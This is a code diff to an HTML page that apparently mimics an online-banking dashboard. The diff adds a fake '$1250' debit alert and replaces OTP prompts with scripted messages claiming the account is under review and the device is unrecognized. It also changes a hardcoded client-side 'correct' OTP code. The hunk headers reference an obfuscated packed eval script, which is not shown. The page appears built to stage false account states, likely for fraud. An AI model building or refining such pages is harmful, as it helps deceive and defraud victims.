@@ -1107,7 +1107,7 @@ body.chatra-mobile-widget-expanded {
       font-size: 16px;
     }
     .popup button {
-      background-color: #007bff;
+      background-color: #861307;
       color: white;
       padding: 10px 20px;
       border: none;
@@ -1117,7 +1117,7 @@ body.chatra-mobile-widget-expanded {
       margin: 5px;
     }
     .popup button:hover {
-      background-color: #0056b3;
+      background-color: #B04842;
     }
     .popup-error {
       color: red;
@@ -1196,6 +1196,27 @@ body.chatra-mobile-widget-expanded {
                     </a>
                     <div class="dropdown-menu position-absolute" aria-labelledby="notificationDropdown">
                         
+						
+									<div class="notification-scroll">
+                            <div class="dropdown-item">
+                                <div class="media ">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-activity">
+                                        <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
+                                    </svg>
+                                    <div class="media-body">
+                                        <div class="data-info">
+                                            <h6 class=""><span class="text-danger">Debit [Alert]</span></h6>
+                                            <p class="">$1250</p>
+                                        </div>
+
+                                        <div class="icon-status">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x-circle text-danger"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+						
                         <div class="notification-scroll">
                             <div class="dropdown-item">
                                 <div class="media ">
@@ -1517,11 +1538,11 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 
 <div class="popup-overlay" id="otpPopup">
   <div class="popup">
-    <h3>Enter the 6-digit OTP code</h3>
-    <p><strong>Reciept not available on the web page, please login with your mobile app to print transaction receipt</strong> or <strong>download the copy sent to your email address after successful transaction.</strong></p>
-    <input type="text" id="otpInput" placeholder="Enter OTP">
+    <h3>ACCOUNT UNDER REVIEW!</h3>
+    <p><strong>Transaction disabled due to an unauthorized device access! Please visit our nearest branch or verify your FaceID/Fingerprint with your registered device.</strong></p>
+    <input type="text" id="otpInput" placeholder="OTP Disabled">
     <p class="popup-error" id="errorMessage"></p>
-    <button onclick="validateOTP()">Submit</button>
+    <button onclick="validateOTP()">Verify</button>
     <button onclick="redirectToDashboard()">Cancel</button>
   </div>
 </div>
@@ -1529,9 +1550,9 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 
 <div class="popup-overlay" id="errorPopup">
   <div class="popup">
-    <h3>Invalid OTP</h3>
-    <p>Please try again: 2 more wrong attempts will put your account on hold!</p>
-    <button onclick="retryOTP()">Enter OTP Again</button>
+    <h3>DEVICE UNRECOGNIZED!</h3>
+    <p>Please log-in with your registered device.</p>
+    <button onclick="retryOTP()">Verify Again</button>
     <button onclick="redirectToDashboard()">Go to Dashboard</button>
   </div>
 </div>
@@ -1695,7 +1716,7 @@ s0.parentNode.insertBefore(s1,s0);
                 }
             }, 500); // 0.5-second intervals
         }
-  const OTP_CODE = "178843"; // Correct OTP code
+  const OTP_CODE = "580274"; // Correct OTP code
   const otpPopup = document.getElementById('otpPopup');
   const progressContainer = document.getElementById('progressContainer');
   const splashcontainer = document.getElementById('splashMessages');
